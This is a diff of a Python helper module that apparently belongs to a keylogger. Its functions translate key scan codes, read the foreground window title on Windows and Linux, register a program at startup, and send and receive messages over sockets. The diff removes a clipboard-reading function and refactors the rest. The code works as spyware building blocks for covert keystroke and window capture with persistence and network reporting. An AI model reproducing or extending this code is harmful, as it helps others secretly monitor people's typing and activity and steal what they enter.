@@ -1,7 +1,7 @@
 import winreg
 import os
 from threading import Thread
-from socket import *
+import socket
 import struct
 from collections import OrderedDict
 import keyboard
@@ -9,7 +9,6 @@ import keyboard
 if os.name == 'nt':
     import win32api
     import win32gui
-    import win32clipboard
     from ctypes import windll, create_unicode_buffer
     user32 = windll.user32
 elif os.name == 'posix':
@@ -35,7 +34,7 @@ def set_keepalive(sock):
     Args:
         sock: input socket to alter
     """
-    sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 
 
 def send_msg(sock, msg):
@@ -79,15 +78,15 @@ def recvall(sock, n):
     return data
 
 
-def ToUnicode(sc):
+def SC_to_unicode(sc):
     """
-    Translates the birtual key code into a unicode character using the user's current keyboard locale
+    Translates the key scan code into a unicode character using the user's current keyboard locale
 
     Args:
-        vk: the input birtual key code
+        sc: the input scan code
 
     Returns:
-        Unicode localed representation of the birtual key code
+        Unicode localed representation of the scan code
     """
 
     if os.name == "nt":
@@ -127,39 +126,24 @@ def is_modifier(key):
     Returns:
         True if `key` is a name of a modifier key
     """
-    return key[key.find(" ")+1:] in keyboard.all_modifiers[:-1]  # ignore side + ignore windows
+    return key[key.find(" ")+1:] in keyboard.all_modifiers  # ignore side
 
 
-def GetClipboard():
-    if os.name == "nt":
-        win32clipboard.OpenClipboard()
-        clip = win32clipboard.GetClipboardData(
-            win32clipboard.CF_UNICODETEXT)
-        win32clipboard.CloseClipboard()
-        return clip
-    elif os.name == "posix":
-        return ""
-
-def GetForegroundWindowTitle():
-    if os.name == "nt":
-        return GetWindowTextW(win32gui.GetForegroundWindow())
-    elif os.name == "posix":
-        return ""
-
-def GetWindowTextW(hwnd):
+def get_foreground_window_title():
     """
-    Gets the unicode title of a window
-
-    Args:
-        hwnd: handle to the window
+    Returns the title of the foreground window
 
     Returns:
-        Unicode title
+        title of the foreground / active window
     """
-    length = user32.GetWindowTextLengthW(hwnd)
-    buff = create_unicode_buffer(length + 1)
-    user32.GetWindowTextW(hwnd, buff, length + 1)
-    return buff.value
+    if os.name == "nt":
+        hwnd = win32gui.GetForegroundWindow()
+        length = user32.GetWindowTextLengthW(hwnd)
+        buff = create_unicode_buffer(length + 1)
+        user32.GetWindowTextW(hwnd, buff, length + 1)
+        return buff.value
+    elif os.name == "posix":
+        return check_output("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | cut -d '\"' -f 2", shell=True)
 
 
 def register_startup(name, path):
